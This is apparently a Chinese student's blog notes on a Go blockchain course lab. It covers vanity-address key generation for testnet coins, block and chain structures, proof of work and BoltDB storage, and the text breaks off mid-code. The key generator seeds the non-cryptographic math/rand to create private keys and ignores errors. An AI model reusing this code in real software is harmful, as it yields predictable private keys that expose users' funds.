<p>在生成随机数环节费劲了一些周折，GenerateKey的第二个参数要求是io.reader类型，正好能对应上<code>crypto/rand</code>里的rand.reader函数，但可惜<code>crypto/rand</code>无法设置种子。<code>math/rand</code>可以设置种子，但是我们需要找到一个能对接上io.reader的rand函数填充进去。经过我不懈的努力，使劲的读go里面ecdsa的源码，了解到了这里面是从一个熵源中不断获取字节串然后转为私钥，所以我们需要生成一个生成足够长字符串的函数，然后利用<code>strings.NewReader</code>这个函数转化为输入流，即io.reader，源码中对字节串长度要求是50，所以我们生成一个长度为50的字符串即可。</p>
<p>以下是我的私钥和公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6969695c49dcc6b9871b1d65838faceb4727bb1ffa7b3a621b47fadf265d2b368</span><br><span class="line">62d3a4bfe04b3d36356ca63ae50c50696e2c3bb366eae2f5349b0eda1bcf54b29288153f70581ab5dd7b0ed963998b7c0526eb93743d72f842768d50baee0372</span><br><span class="line">mgnLo3xn5CzEyD3N6LKTg9GtcccvrixwXs</span><br></pre></td></tr></table></figure>
<p><strong>存疑一</strong>：我不知道公钥是啥格式，我这是128长度的，之前文件的样例是66长度的，是压缩公钥形式，具体形式待向助教求证。</p>
<p><strong>存疑二：</strong> 用的是GO库里自带的P256曲线，别名是 secp256r1，好像应该用secp256k1？？</p>
<p>此为我领取成功的截图。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211021234404398.png" alt="image-20211021234404398"></p>
<p>挖到了人生第一枚币！虽然是测试用的。</p>
<p>经过助教核实，公钥就要33字节的，于是我又花了一上午往我的goroot下安装第三方库，跑到go的官方文档去找到了</p>
<p><a href="https://pkg.go.dev/github.com/BSNDA/PCNGateway-Go-SDK/pkg/util/crypto/secp256k1#pkg-variables，有我们熟悉的函数，接口可以直接对接。">https://pkg.go.dev/github.com/BSNDA/PCNGateway-Go-SDK/pkg/util/crypto/secp256k1#pkg-variables，有我们熟悉的函数，接口可以直接对接。</a></p>
<p>至于压缩公钥的，有这个<a href="https://pkg.go.dev/github.com/decred/dcrd/dcrec/secp256k1#section-readme，但可惜调用不了，还有C的底层代码，懒得去装了，直接手写了一个压缩公钥的（又是特别丑的代码">https://pkg.go.dev/github.com/decred/dcrd/dcrec/secp256k1#section-readme，但可惜调用不了，还有C的底层代码，懒得去装了，直接手写了一个压缩公钥的（又是特别丑的代码</a></p>
<p>为了彻底跑通这个代码还去补充了这个第三方库<a href="https://github.com/pkg/errors/blob/master/errors.go">https://github.com/pkg/errors/blob/master/errors.go</a></p>
<p>把第三方库装齐了之后终于能跑通啦，这是全新的代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/ecdsa&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/BSNDA/PCNGateway-Go-SDK/pkg/util/crypto/secp256k1&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> src = rand.New(rand.NewSource(xxxxxxxx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RandStringBytesMaskImprSrc</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="keyword">byte</span>, (n+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">if</span> _, err := src.Read(b); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> hex.EncodeToString(b)[:n]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BytesToInt</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	bytesBuffer := bytes.NewBuffer(b)</span><br><span class="line">	<span class="keyword">var</span> x <span class="keyword">int32</span></span><br><span class="line">	binary.Read(bytesBuffer, binary.BigEndian, &amp;x)</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">int</span>(x)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">secp256</span><span class="params">()</span> <span class="params">(ecdsa.PrivateKey,[]<span class="keyword">byte</span>)</span></span>&#123;</span><br><span class="line">	curve := secp256k1.SECP256K1()</span><br><span class="line">	privKey, err := ecdsa.GenerateKey(curve, strings.NewReader(RandStringBytesMaskImprSrc(<span class="number">50</span>)))</span><br><span class="line">	<span class="keyword">if</span> err !=<span class="literal">nil</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	Y := hex.EncodeToString(privKey.PublicKey.Y.Bytes())</span><br><span class="line">	length := <span class="built_in">len</span>(Y)</span><br><span class="line">	<span class="keyword">var</span> pubKey []<span class="keyword">byte</span></span><br><span class="line">	<span class="keyword">if</span> Y[length - <span class="number">1</span>] % <span class="number">2</span> == <span class="number">1</span> &#123;</span><br><span class="line">		pubKey = <span class="built_in">append</span>([]<span class="keyword">byte</span>(<span class="string">&quot;\x03&quot;</span>),privKey.PublicKey.X.Bytes()...)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		pubKey = <span class="built_in">append</span>([]<span class="keyword">byte</span>(<span class="string">&quot;\x02&quot;</span>),privKey.PublicKey.X.Bytes()...)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> *privKey, pubKey</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Checkccc</span><span class="params">(src <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(src)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length - <span class="number">2</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> src[i] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; src[i + <span class="number">1</span>] ==<span class="string">&#x27;c&#x27;</span> &amp;&amp; src[i + <span class="number">2</span>] ==<span class="string">&#x27;c&#x27;</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MineCracker_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		privatekey,public :=secp256()</span><br><span class="line">		address := getAddress(public)</span><br><span class="line">		<span class="keyword">if</span> Checkccc(address) == <span class="literal">true</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%x\n&quot;</span>,privatekey.D.Bytes())</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%s\n&quot;</span>,hex.EncodeToString(public))</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, address)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>改了个seed，挖到了地址，提交，成功获得0.001测试币，这次我真的拿到私钥了，这次绝对能用了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">326138383534xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx(私钥保密</span><br><span class="line">038301a3c40bea42c622ecbeb453900aaad4124397993d2282781b4f2a5c32410d</span><br><span class="line">mwaXcViKVmtYHomvL7eHh9pncccPtyyHrb</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211023135225388.png" alt="image-20211023135225388"></p>
<p>队友s0uthwood推荐的另外一种装secp256k1更方便的方法：<a href="https://blog.csdn.net/lancefox/article/details/107321807">https://blog.csdn.net/lancefox/article/details/107321807</a></p>
<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><p>因为疫情重庆比赛计划被学校拦了，心态炸裂。</p>
<h2 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h2><h3 id="构建区块"><a href="#构建区块" class="headerlink" title="构建区块"></a>构建区块</h3><p>不得不说实验设计的是真的好，手把手教学。</p>
<p>这一个实验就让你写几行代码，一个区块要维护的信息有：时间戳，数据块，前一节点哈希，还有自身哈希，自身哈希由前三个计算得来，所以我们只需要把前三个拼起来算个哈希即可。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Block <span class="keyword">struct</span> &#123;</span><br><span class="line">	Time <span class="keyword">int64</span></span><br><span class="line">	Data []<span class="keyword">byte</span></span><br><span class="line">	PrevHash []<span class="keyword">byte</span></span><br><span class="line">	Hash []<span class="keyword">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlock</span><span class="params">(data <span class="keyword">string</span>, prevHash []<span class="keyword">byte</span>)</span> *<span class="title">Block</span></span> &#123;</span><br><span class="line">	block := &amp;Block&#123;time.Now().Unix(), []<span class="keyword">byte</span>(data), prevHash, []<span class="keyword">byte</span>&#123;&#125;&#125;</span><br><span class="line">	block.SetHash()</span><br><span class="line">	<span class="keyword">return</span> block</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span> <span class="title">SetHash</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Hash := sha256.Sum256(<span class="built_in">append</span>(<span class="built_in">append</span>(b.PrevHash, IntToHex(b.Time)...), b.Data...))</span><br><span class="line">	b.Hash = Hash[:]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">block_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">   block := NewBlock(<span class="string">&quot;Genesis Block&quot;</span>, []<span class="keyword">byte</span>&#123;&#125;)</span><br><span class="line">   fmt.Printf(<span class="string">&quot;Prev. hash: %x\n&quot;</span>, block.PrevHash)</span><br><span class="line">   fmt.Printf(<span class="string">&quot;Time: %s\n&quot;</span>, time.Unix(block.Time, <span class="number">0</span>).Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>))</span><br><span class="line">   fmt.Printf(<span class="string">&quot;Data: %s\n&quot;</span>, block.Data)</span><br><span class="line">   fmt.Printf(<span class="string">&quot;Hash: %x\n&quot;</span>, block.Hash)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出成功截图</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211026111516645.png" alt="image-20211026111516645"></p>
<h3 id="实现一条链"><a href="#实现一条链" class="headerlink" title="实现一条链"></a>实现一条链</h3><p>这个就是字面意思，实现一个创世链头，实现一个往尾部插的函数，就结束了。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Blockchain <span class="keyword">struct</span> &#123;</span><br><span class="line">	blocks []*Block</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *Blockchain)</span> <span class="title">AddBlock</span><span class="params">(data <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	Hash := bc.blocks[<span class="built_in">len</span>(bc.blocks) - <span class="number">1</span>].Hash</span><br><span class="line">	block := NewBlock(data, Hash)</span><br><span class="line">	bc.blocks = <span class="built_in">append</span>(bc.blocks, block)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewGenesisBlock</span><span class="params">()</span> *<span class="title">Block</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> NewBlock(<span class="string">&quot;Genesis Block&quot;</span>, []<span class="keyword">byte</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlockchain</span><span class="params">()</span> *<span class="title">Blockchain</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;Blockchain&#123;[]*Block&#123;NewGenesisBlock()&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>实验截图：<br><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211026141111899.png" alt="image-20211026141111899"></p>
<h3 id="添加工作量证明模块"><a href="#添加工作量证明模块" class="headerlink" title="添加工作量证明模块"></a>添加工作量证明模块</h3><p>这个对区块计算哈希的方法进行了修改，新增了区块中nonce的属性，然后time和data的顺序都有变化，但我们不必到<code>block.go</code>里修改，因为这里的<code>prepareData</code>函数已经帮我们拼好了，我们只需要对这个函数的返回值算哈希就好了。</p>
<p>然后在<code>Run</code>这个函数的时候，我们就把nonce从0开始加，每次新算一遍hash，如果转成BigInt如果小于$2^{236}$就表示前20位为0了，工作量证明完毕，区块可以进行添加。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/big&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> targetBits = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ProofOfWork <span class="keyword">struct</span> &#123;</span><br><span class="line">	block  *Block</span><br><span class="line">	target *big.Int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewProofOfWork</span><span class="params">(b *Block)</span> *<span class="title">ProofOfWork</span></span> &#123;</span><br><span class="line">	target := big.NewInt(<span class="number">1</span>)</span><br><span class="line">	target.Lsh(target, <span class="keyword">uint</span>(<span class="number">256</span>-targetBits))</span><br><span class="line"></span><br><span class="line">	pow := &amp;ProofOfWork&#123;b, target&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> pow</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pow *ProofOfWork)</span> <span class="title">prepareData</span><span class="params">(nonce <span class="keyword">int64</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data := bytes.Join(</span><br><span class="line">		[][]<span class="keyword">byte</span>&#123;</span><br><span class="line">			pow.block.PrevHash,</span><br><span class="line">			pow.block.Data,</span><br><span class="line">			IntToHex(pow.block.Time),</span><br><span class="line">			IntToHex(<span class="keyword">int64</span>(targetBits)),</span><br><span class="line">			IntToHex(nonce),</span><br><span class="line">		&#125;,</span><br><span class="line">		[]<span class="keyword">byte</span>&#123;&#125;,</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pow *ProofOfWork)</span> <span class="title">Run</span><span class="params">()</span> <span class="params">(<span class="keyword">int64</span>, []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> hashInt big.Int</span><br><span class="line">	<span class="keyword">var</span> hash [<span class="number">32</span>]<span class="keyword">byte</span></span><br><span class="line">	<span class="keyword">var</span> nonce <span class="keyword">int64</span></span><br><span class="line">	nonce = <span class="number">0</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;Mining the block containing \&quot;%s\&quot;\n&quot;</span>, pow.block.Data)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		here := pow.prepareData(nonce)</span><br><span class="line">		hash = sha256.Sum256(here)</span><br><span class="line">		hashInt.SetBytes(hash[:])</span><br><span class="line">		<span class="keyword">if</span> hashInt.Cmp(pow.target) &lt; <span class="number">0</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		nonce += <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;\r%x&quot;</span>, hash)</span><br><span class="line">	fmt.Print(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> nonce, hash[:]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pow *ProofOfWork)</span> <span class="title">Validate</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> hashInt big.Int</span><br><span class="line">	hashInt.SetBytes(pow.block.Hash)</span><br><span class="line">	<span class="keyword">if</span> hashInt.Cmp(pow.target) &lt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时区块部分代码修改， 重点在于SetHash，要经过一段时间的计算。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Block <span class="keyword">struct</span> &#123;</span><br><span class="line">	Time <span class="keyword">int64</span></span><br><span class="line">	Data []<span class="keyword">byte</span></span><br><span class="line">	PrevHash []<span class="keyword">byte</span></span><br><span class="line">	Hash []<span class="keyword">byte</span></span><br><span class="line">	Nonce <span class="keyword">int64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlock</span><span class="params">(data <span class="keyword">string</span>, prevHash []<span class="keyword">byte</span>)</span> *<span class="title">Block</span></span> &#123;</span><br><span class="line">	block := &amp;Block&#123;time.Now().Unix(), []<span class="keyword">byte</span>(data), prevHash, []<span class="keyword">byte</span>&#123;&#125;, <span class="number">0</span>&#125;</span><br><span class="line">	block.SetHash()</span><br><span class="line">	<span class="keyword">return</span> block</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span> <span class="title">SetHash</span><span class="params">()</span></span> &#123;</span><br><span class="line">	pow := NewProofOfWork(b)</span><br><span class="line">	b.Nonce, b.Hash = pow.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211026194736013.png" alt="image-20211026194736013"></p>
<h3 id="阅读代码：添加数据库"><a href="#阅读代码：添加数据库" class="headerlink" title="阅读代码：添加数据库"></a>阅读代码：添加数据库</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/boltdb/bolt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Blockchain_in_dbIterator <span class="keyword">struct</span> &#123;</span><br><span class="line">	currentHash []<span class="keyword">byte</span></span><br><span class="line">	db          *bolt.DB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *Blockchain_in_db)</span> <span class="title">Iterator</span><span class="params">()</span> *<span class="title">Blockchain_in_dbIterator</span></span> &#123;</span><br><span class="line">	bci := &amp;Blockchain_in_dbIterator&#123;bc.tip, bc.db&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bci</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i *Blockchain_in_dbIterator)</span> <span class="title">Next</span><span class="params">()</span> *<span class="title">Block</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> block *Block</span><br><span class="line"></span><br><span class="line">	err := i.db.View(<span class="function"><span class="keyword">func</span><span class="params">(tx *bolt.Tx)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">		b := tx.Bucket([]<span class="keyword">byte</span>(blocksBucket))</span><br><span class="line">		encodedBlock := b.Get(i.currentHash)</span><br><span class="line">		block = DeserializeBlock(encodedBlock)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	i.currentHash = block.PrevHash</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> block</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>三个问题：</p>
<ul>
<li><p>为什么需要在block类中添加Serialize()和DeserializeBlock()两个函数？他们主要做了什么？   </p>
<p>序列化是将对象转化为字节串从而能存进数据库进行保存，而反序列化是能从字节串完全恢复出一个对象来。</p>
</li>
<li><p>描述一下NewBlockchain()和NewBlock()的执行逻辑。</p>
<p>打开数据库文件，检查是否存在一个区块链，若存在则创建实例， tip设置为最后一个区块hash，若不存在则创建创世区块，存进数据库，把key1设位创世块的hash，tip指向他。</p>
</li>
<li><p>Blockchain类中的tip变量是做什么用的？</p>
<p>tip变量定义为从数据中读取出来的变量，当存在区块链时，tip设置为读取到的最后一个区块hash；当不存在区块链时，tip设置为创世区块的 hash。实际上可以理解tip为区块链的一种标识符。</p>
</li>
<li><p>迭代器Interator是如何工作使得我们能够从数据库中遍历出区块信息的？</p>
<p>数据库迭代器，通过迭代器的next操作遍历整个数据库，从而做到区块的遍历。</p>
</li>
</ul>
<h3 id="实现命令行接口"><a href="#实现命令行接口" class="headerlink" title="实现命令行接口"></a>实现命令行接口</h3><p>添加两个命令行参数：</p>
<ul>
<li><code>listblocks</code> 把当前链的所有节点的信息输出</li>
<li><code>newblock</code>后跟<code>-data</code> 参数外加节点信息。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/boltdb/bolt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dbFile = <span class="string">&quot;Blockchain_in_db_demo.db&quot;</span></span><br><span class="line"><span class="keyword">const</span> blocksBucket = <span class="string">&quot;blocks&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Blockchain_in_db <span class="keyword">struct</span> &#123;</span><br><span class="line">	tip []<span class="keyword">byte</span></span><br><span class="line">	db  *bolt.DB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *Blockchain_in_db)</span> <span class="title">AddBlock</span><span class="params">(data <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> lastHash []<span class="keyword">byte</span></span><br><span class="line"></span><br><span class="line">	err := bc.db.View(<span class="function"><span class="keyword">func</span><span class="params">(tx *bolt.Tx)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">		b := tx.Bucket([]<span class="keyword">byte</span>(blocksBucket))</span><br><span class="line">		lastHash = b.Get([]<span class="keyword">byte</span>(<span class="string">&quot;l&quot;</span>))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//fmt.Printf(&quot;abbb %s %s\n&quot;,string(data), lastHash)</span></span><br><span class="line">	newBlock := NewBlock(data, lastHash)</span><br><span class="line"></span><br><span class="line">	err = bc.db.Update(<span class="function"><span class="keyword">func</span><span class="params">(tx *bolt.Tx)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">		b := tx.Bucket([]<span class="keyword">byte</span>(blocksBucket))</span><br><span class="line">		<span class="comment">//fmt.Printf(&quot;aaa%s\n&quot;,string(newBlock.Hash))</span></span><br><span class="line">		err := b.Put(newBlock.Hash, newBlock.Serialize())</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Panic(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = b.Put([]<span class="keyword">byte</span>(<span class="string">&quot;l&quot;</span>), newBlock.Hash)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Panic(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		bc.tip = newBlock.Hash</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlockchain_in_db</span><span class="params">()</span> *<span class="title">Blockchain_in_db</span></span> &#123;</span><br><span class="line">	fmt.Print(<span class="string">&quot;No existing blockchain found. creating a new one...\n&quot;</span>)</span><br><span class="line">	<span class="keyword">var</span> tip []<span class="keyword">byte</span></span><br><span class="line">	db, err := bolt.Open(dbFile, <span class="number">0600</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Panic(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = db.Update(<span class="function"><span class="keyword">func</span><span class="params">(tx *bolt.Tx)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">		b := tx.Bucket([]<span class="keyword">byte</span>(blocksBucket))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> b == <span class="literal">nil</span> &#123;</span><br><span class="line">			genesis := NewGenesisBlock()</span><br><span class="line">			b, err := tx.CreateBucket([]<span class="keyword">byte</span>(blocksBucket))</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Panic(err)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			err = b.Put(genesis.Hash, genesis.Serialize())</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Panic(err)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			err = b.Put([]<span class="keyword">byte</span>(<span class="string">&quot;l&quot;</span>), genesis.Hash)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Panic(err)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			tip = genesis.Hash</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			tip = b.Get([]<span class="keyword">byte</span>(<span class="string">&quot;l&quot;</span>))</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	bc := Blockchain_in_db&#123;tip, db&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;bc</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">blockchain_db_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	bc := NewBlockchain_in_db()</span><br><span class="line">	bc.AddBlock(<span class="string">&quot;Send 1 BTC to Ivan&quot;</span>)</span><br><span class="line">	bc.AddBlock(<span class="string">&quot;Send 2 more BTC to Ivan&quot;</span>)</span><br><span class="line">	bci := bc.Iterator()</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		block := bci.Next()</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Prev. hash: %x\n&quot;</span>, block.PrevHash)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Data: %s\n&quot;</span>, block.Data)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Hash: %x\n&quot;</span>, block.Hash)</span><br><span class="line">		